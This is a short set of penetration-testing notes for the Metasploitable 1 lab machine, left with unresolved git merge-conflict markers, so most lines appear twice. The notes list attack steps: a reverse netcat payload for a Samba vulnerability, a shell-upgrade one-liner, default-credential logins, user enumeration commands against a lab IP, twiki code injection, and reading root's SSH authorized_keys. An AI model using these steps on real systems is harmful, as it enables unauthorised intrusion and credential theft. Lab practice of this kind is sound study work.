<<<<<<< HEAD
#set PAYLOAD cmd/unix/reverse_netcat
#python -c 'import pty;pty.spawn("/bin/bash")'
#samba vuln / usermap_script
#tomcat default creds
#linux kernel exploit
#postgres sql vuln (default creds)
#dirbuster the port 80
#enum4linux to enumerate users
#!! | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > userlist
# smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 > smtp_users
# cat smtp_users | grep exists | cut -d" " -f2 >> users
# enum4linux -U 10.11.1.10
# !! | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > userlist
# smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 > smtp_users
# cat smtp_users | grep exists | cut -d" " -f2 >> userslist
cat userlist | sore -u > users_metasploitable
=======
### METASPLOITABLE 1 ###

# Samba vulnerability
-set PAYLOAD cmd/unix/reverse_netcat
-python -c 'import pty;pty.spawn("/bin/bash")'

# Tomcat
-tomcat default creds

# Privilege Escalation
linux kernel exploit (udev link)

# mySQL database
postgres sql vuln (default creds)

# Web App
dirbuster the port 80 (dircbuster or dirb)
## More ways to PWN!! ##
-enum4linux to enumerate users
-!! | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > userlist
-smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 > smtp_users
-cat smtp_users | grep exists | cut -d" " -f2 >> users
-linux command: cut
-twikidblib informational disclosure
-twiki php code injection / execution
-low priv shell -> look for ssh keys!
-ls -lsart /root/.ssh
-cat /root/.ssh/authorized_keys
grep -lr
>>>>>>> 8fcedb163f27d6ed2afbb379e83d8e9f9ed5ba9f
